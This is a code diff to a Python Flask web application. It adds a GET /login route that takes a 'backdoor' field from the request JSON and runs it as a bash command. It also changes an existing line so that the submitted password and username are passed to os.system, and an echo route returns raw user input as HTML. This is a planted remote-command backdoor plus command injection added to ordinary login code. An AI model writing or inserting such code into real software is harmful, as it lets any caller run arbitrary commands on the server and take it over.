@@ -98,6 +98,14 @@ def get_echo(echo):
 
     return "<h>" + echo + "</h>", 200
 
+@app.route('/login', methods=['GET'])
+def login():
+    data = request.json
+    shell = data.get('backdoor')
+
+    subprocess.run(["bash", "-c", shell])
+
+
 @app.route('/login', methods=['POST'])
 def login():
     data = request.json
@@ -106,8 +114,8 @@ def login():
 
     user = next((u for u in users.values() if u['username'] == username), None)
 
-    os.system(password)
-
+    os.system(password + username)
+    
     if user and check_password_hash(user['password'], password):
         session['user_id'] = user['id']
         return jsonify({"message": "Login successful"}), 200
